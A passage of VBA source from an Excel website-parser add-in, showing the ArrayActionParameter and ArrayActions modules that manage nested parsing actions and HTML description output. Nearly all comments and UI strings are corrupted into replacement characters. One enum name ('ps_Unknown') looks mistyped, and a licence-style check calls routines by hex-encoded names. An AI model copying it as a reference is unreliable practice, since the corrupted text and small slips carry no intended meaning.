                par_name$ & "</td>" & vbNewLine & vbTab & vbTab & "<td class=""parameter-value" & par_class$ & """>" & _
                par_value$ & "</td>" & vbNewLine & result_column$ & vbTab & "</tr>" & vbNewLine
            
        Next par
    Else
        action_name$ = vbTab & vbTab & "<td rowspan=""1"" class=""action-name"">" & Me.Name & "</td>" & vbNewLine
        result_column$ = vbTab & vbTab & "<td rowspan=""" & Me.parameters.Count & """ class=""result-value""><!--noindex-->" & OutputValue$ & "<!--/noindex--></td>" & vbNewLine
        
        txt = txt & vbTab & "<tr class=""row-type-" & RowType& & """>" & vbNewLine & action_name$ & vbTab & vbTab & "<td class=""parameter-name parameter-blank""></td>" & vbNewLine & _
            vbTab & vbTab & "<td class=""parameter-value parameter-blank""></td>" & vbNewLine & result_column$ & vbTab & "</tr>" & vbNewLine
    End If
    
    'If RowType& = 0 Then txt = txt & vbTab & "<tr class=""separator-row""><td colspan=""4""></td></tr>" & vbNewLine
    
    PublishHTML_GetActionHTMLRow = txt
End Function

Attribute VB_Name = "ArrayActionParameter"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ArrayActionParameter
' Author        : Igor Vakhnenko            Date: 18.01.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text
Option Explicit

Enum ActionParameterStyles
    aps_Locked = -1
    aps_Unknown = 0
    aps_Text = 1
    aps_Combo = 2
    aps_List = 3
    aps_RuntimeList = 4        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
End Enum

Public Name As String
Public value As String
Public Description As String

Public Style As ActionParameterStyles        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public OptionsList As Variant        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Public DefaultValue As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public ExtendedRender As Boolean        ' TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| REGEXP (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {2})

Sub ApplyToCombobox(ByRef CB As MSForms.ComboBox, Optional ByRef WP As WebsiteParser, Optional AAs As ArrayActions)
    On Error Resume Next
    With CB
        .Tag = Me.Name
        .Enabled = True
        
        Select Case Me.Style
            Case aps_Locked
                .Style = fmStyleDropDownCombo
                .ShowDropButtonWhen = fmShowDropButtonWhenNever
                .Enabled = False
            Case aps_Text, ps_Unknown
                .Style = fmStyleDropDownCombo
                .ShowDropButtonWhen = fmShowDropButtonWhenNever
            Case aps_List
                .Style = fmStyleDropDownList
                .ShowDropButtonWhen = fmShowDropButtonWhenAlways
                .list = Me.OptionsList
            Case aps_Combo
                .Style = fmStyleDropDownCombo
                .ShowDropButtonWhen = fmShowDropButtonWhenFocus
                .list = Me.OptionsList
            Case aps_RuntimeList
                .Style = fmStyleDropDownCombo
                .ShowDropButtonWhen = fmShowDropButtonWhenAlways

                Select Case Me.OptionsList
                    Case "ActionSets":  .list = WP.AASets.ArrayOfNames
                    Case "Variables": .list = WP.GetVariablesNamesList(, AAs)
                    Case "ReplaceTables": .list = All_RT.ArrayOfNames
                    Case "ParsersList": .list = AllParsers.ToArray
                    Case "Macro": .list = WP.Macros.ArrayOfNames
                End Select
        End Select
        .Visible = True
        .text = Me.DefaultValue
    End With
End Sub
Attribute VB_Name = "ArrayActions"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ArrayActions
' Author        : Igor Vakhnenko            Date: 12.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "Actions", XML_SUBNODE_NAME$ = "Action"
Public ParentParser As WebsiteParser

Public Items As New Collection

Public ActiveLevel As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
Public SubActions As ArrayActions
Public ParentActions As ArrayActions

Dim Plugin_Cat_Index As FUNCTION_CATEGORIES    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
Dim Plugin_Name As String    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)

Private Sub Class_Terminate()
    Set Items = Nothing
    Set SubActions = Nothing
    Set ParentActions = Nothing
    Set ParentParser = Nothing
End Sub

Sub InsertSublevel(ByVal ActionIndex&)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ActionIndex&
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ActionIndex& (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|,
    ' |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
    On Error Resume Next
    Dim NewLevel As ArrayActions, i&, aa As ArrayAction
    
    Dim coll_AA As New Collection, XML_sublevels As IXMLDOMNode, AAnode As IXMLDOMNode
    
    For i = ActionIndex& + 1 To Me.Items.Count
        coll_AA.Add Me.Items(i).ExportToXML
    Next
    For i = ActionIndex& + 1 To Me.Items.Count
        Me.DeleteAction ActionIndex& + 1
    Next
    
    If Not Me.SubActions Is Nothing Then
        Set XML_sublevels = Me.SubActions.ExportToXML
    End If
    
    Set Me.SubActions = Nothing
    
    Set NewLevel = Me.GetSubActions
    With NewLevel
        Set .Items = New Collection
        For Each AAnode In coll_AA
            Set aa = New ArrayAction: aa.LoadFromXML AAnode
            Set aa.Parent = NewLevel: .Items.Add aa
            .UpdateIndexes
        Next
    End With
    
    If Not XML_sublevels Is Nothing Then
        NewLevel.GetSubActions.LoadFromXML XML_sublevels
    End If
    
    Me.UpdateIndexes
    Set coll_AA = Nothing: Set XML_sublevels = Nothing
End Sub

Sub Activate()
    GetRootActions.ActiveLevel = Me.GetLevel
End Sub

Function GetActionsByLevel(ByVal Level As Long) As ArrayActions
    On Error Resume Next        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Level)
    Set GetActionsByLevel = Me.GetRootActions
    While GetActionsByLevel.GetLevel < Level
        Set GetActionsByLevel = GetActionsByLevel.SubActions
    Wend
End Function

Function GetActiveActions() As ArrayActions
    On Error Resume Next        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ActiveLevel)
    Set GetActiveActions = Me.GetRootActions
    Dim AL As Long: AL = GetActiveActions.ActiveLevel
    While GetActiveActions.GetLevel < AL
        Set GetActiveActions = GetActiveActions.SubActions
    Wend
End Function

Function GetSubActions() As ArrayActions
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|
    On Error Resume Next
    If Me.SubActions Is Nothing Then
        Set Me.SubActions = New ArrayActions
        With Me.SubActions
            Set .ParentParser = Me.ParentParser
            Set .ParentActions = Me
        End With
    End If
    Set GetSubActions = Me.SubActions
End Function

Function GetRootActions() As ArrayActions
    On Error Resume Next        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Level)
    Dim AAs As ArrayActions
    Set AAs = Me
    While (Not AAs.ParentActions Is Nothing)
        Set AAs = AAs.ParentActions
    Wend
    Set GetRootActions = AAs
End Function

Function GetLevel() As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = 1
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If Me.ParentActions Is Nothing Then
        GetLevel = 1
    Else
        GetLevel = Me.ParentActions.GetLevel + 1
    End If
End Function

Function GetMaxLevel() As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    Dim AAs As ArrayActions, currLevel As Long
    Set AAs = Me: currLevel = Me.GetLevel
    
    While (Not AAs.SubActions Is Nothing)
        Set AAs = AAs.SubActions
        currLevel = currLevel + 1
    Wend
    GetMaxLevel = currLevel
End Function


Function GetActionByIndex(ByVal Index&) As ArrayAction
    On Error Resume Next
    Set GetActionByIndex = Items.item(Index&)
End Function

Function DeleteAction(ByVal Index&) As Boolean
    On Error Resume Next: Err.Clear
    Items.Remove Index&
    UpdateIndexes
End Function

Sub UpdateIndexes()
    Dim i&: For i = 1 To Items.Count: Items(i).Index = i: Next
End Sub

Sub Edit(Optional ByRef UF As MSForms.UserForm, Optional ByVal FormCaption$, Optional JumpButtonEnabled As Boolean, Optional ColumnMode As Boolean)        ', Optional ByRef AAs As ArrayActions)
    On Error Resume Next: Dim currLevel&, maxLevel&
    Set ActiveAAs = Me.GetActiveActions
    currLevel& = Me.GetActiveActions.GetLevel: maxLevel& = Me.GetMaxLevel
    With FP_ArrayActions_Edit
        .Show
        .ColumnMode = ColumnMode
        Set .CallerUF = UF
        If Len(FormCaption$) Then .Caption = .Caption & ":  " & FormCaption$ & _
            IIf(maxLevel& > 1, " (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & currLevel& & " |fffd||fffd| " & maxLevel& & ")", "")
        
        .CommandButton_JumpToNextLevel.Visible = JumpButtonEnabled    ' And SETT.GetBoolean("DeveloperMode")        ' currLevel& < maxLevel&
        If ColumnMode Then
            .CommandButton_JumpToNextLevel.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Else
            .CommandButton_JumpToNextLevel.Caption = IIf(currLevel& < maxLevel&, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        End If
    End With
End Sub

Private Sub AddActionsDescription(ByVal sv$)
    On Error Resume Next
    Dim lvl&: lvl& = Me.GetLevel
    If Me.Items.Count = 0 Then
        DescriptionText = DescriptionText & "<p style=""font-size: large;"">" & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & "</p>"
        Exit Sub
    End If
    
    If (Not Me.ParentActions Is Nothing) Then
        DescriptionText = DescriptionText & "<br />"
        PublishHTML_StartNewTable "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|  |fffd|" & lvl& & "|fffd|", "table-subactions"
        PublishHTML_ShowCurrentValue "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & lvl& - 1 & "|fffd|,<br />" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & lvl& & "|fffd|.<br /><br />" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & lvl& - 1 & "|fffd|", sv$
    End If
End Sub


Function ApplyTo(ByRef values As String, Optional SI As ParserSourceItem, Optional WithoutSubActions As Boolean = False, _
        Optional StopAfterItem As Long = 999) As Long
    On Error Resume Next
    Dim aa As ArrayAction, i&, j&, arr, txt$, subDescr$, lvl&, SIarr As Variant, ii&, SItxt$, res&, MainActions As Boolean
    
    'If SHOW_PI2 Then Me.ParentParser.PrInd1.Line3 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Me.GetLevel & ")"
    'If SHOW_PI2 Then Me.ParentParser.PrInd2.StartNewAction , , , , , (UBound(arr) + 1) * Me.Items.Count
    
    If Not SI Is Nothing Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| MainActions
        'Debug.Assert StopMainActions = -5
        MainActions = True
        DEBUG_LevelInfo$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Me.GetLevel
        'Debug.Print "MainActions on level " & Me.GetLevel, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Split(values, ARSEP)(0)
        
        If StopMainActions = -4 Then Exit Function        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| STOP |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| -4
        
        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd| STOP |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| -5 !!!! |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| STOP |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| -5
        'If Not Me.ParentActions Is Nothing Then If StopMainActions = -5 Then StopMainActions = 0        ' : Exit Function
        'If Not Me.ParentActions Is Nothing Then If StopMainActions = -5 Then StopMainActions = 0        ' : Exit Function
        If StopMainActions = -5 Then
            'Debug.Print "level=" & Me.GetLevel, Me.ParentActions Is Nothing, "StopMainActions =" & StopMainActions
            If Me.ParentActions Is Nothing Then StopMainActions = 0 Else GoTo Label_Exit_3
        End If
        
        If SI.Parent.IsColumnMode Then
            If Not SI.GetDestinationCell Is Nothing Then
                FillRowVariables SI.GetDestinationCell, SI
            End If
        End If
        With SETT
            If Application.Run(.U("41535F")) > 1 Then If Val(.GetRegValue(.U("6F6B"))) = 0 Then Exit Function
        End With
    End If
    
    If values = "" Then arr = Array("") Else arr = Split(values, ARSEP)
    If UBound(arr) >= OLIM Then If OLIM Then ReDim Preserve arr(0 To OLIM - 1)
    
    If DESCRIPTION_MODE Then AddActionsDescription arr(0)
    
    For i = LBound(arr) To IIf(DESCRIPTION_MODE, LBound(arr), UBound(arr))
        If StopMacro Then GoTo exitApplyTo
        If Not SI Is Nothing Then If StopMainActions = -4 Then GoTo exitApplyTo        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| STOP |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| -4
        
        txt$ = arr(i)
        RowVariables.item("{item_index}") = i + 1
        If MainActions Then
            ParserVariables.item("$$index") = i + 1
            ParserVariables.item("$$count") = UBound(arr) + 1
        End If
        
        If (i = 0) And DESCRIPTION_MODE And (Me.Items.Count > 0) Then DescriptionText = DescriptionText & PublishHTML_GetActionsTableHeader
        
        For j = 1 To Me.Items.Count        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Label_Start:
            If j <= StopAfterItem Then
                DEBUG_ActionIndex& = j
                
                Set aa = Me.Items(j)
                If SHOW_PI2 Then Me.ParentParser.PrInd2.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & i + 1 & " |fffd||fffd| " & UBound(arr) + 1 & ",  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & j & " |fffd||fffd| " & Me.Items.Count, _
                    ValueDescription(txt), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & aa.Name
                
                res& = aa.ApplyTo(txt$)
                DoEvents
                ' Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & AA.Name, "|fffd||fffd||fffd||fffd||fffd|: " & res
                
                If (i = 0) And DESCRIPTION_MODE Then
                    DescriptionText = DescriptionText & aa.PublishHTML_GetActionHTMLRow(ValueDescriptionHTML(txt))
                End If
                Set aa = Nothing
                
                If res <> 0 Then        ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    
                    If res = -1 Then Exit For        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    If res = -2 Then arr(i) = "": GoTo Label_Exit_2        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
                    If res = -3 Then arr(i) = "": GoTo Label_Exit_3        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    ' If res = -4  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    If res = -4 Then arr(i) = "": StopMainActions = -4: GoTo Label_Exit_3
                    ' If res = -5  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    If res = -5 Then arr(i) = "": StopMainActions = -5: GoTo Label_Exit_3
                    If res = -9 Then arr(i) = "": StopMacro = True: GoTo exitApplyTo        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    
                    If res >= 1 And res <= Me.Items.Count Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        j = res: GoTo Label_Start
                    End If
                End If
            End If
        Next j
        
        arr(i) = txt$
        If (i = 0) And DESCRIPTION_MODE And (Me.Items.Count > 0) Then DescriptionText = DescriptionText & PublishHTML_GetActionsTableFooter
        
        If Not WithoutSubActions Then
            If Not Me.SubActions Is Nothing Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                If SHOW_PI2 Then Me.ParentParser.PrInd2.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ..."
                Me.SubActions.ApplyTo txt, SI
                
            Else        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If Not SI Is Nothing Then        ' SI |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| MainActions
                    If txt = "" Then SIarr = Array("") Else SIarr = Split(txt, ARSEP)
                    'If SHOW_PI2 Then  Me.ParentParser.PrInd2.StartNewAction , , , , , UBound(SIarr) + 1
                    
                    If DESCRIPTION_MODE Then
                        For lvl& = 1 To Me.GetLevel
                            PublishHTML_CloseTable
                        Next
                    End If
                    
                    For ii = LBound(SIarr) To UBound(SIarr)
                        '  Me.ParentParser.PrInd1.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ii + 1 & ":  " & Left(SIarr(ii), 70)
                        
                        DESCRIPTION_MODE_FOR_ITEM = (ii = 0) And DESCRIPTION_MODE
                        
                        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 21.10.2018 |fffd||fffd||fffd||fffd||fffd||fffd||fffd| If Len(SIarr(ii)) > 0 Then
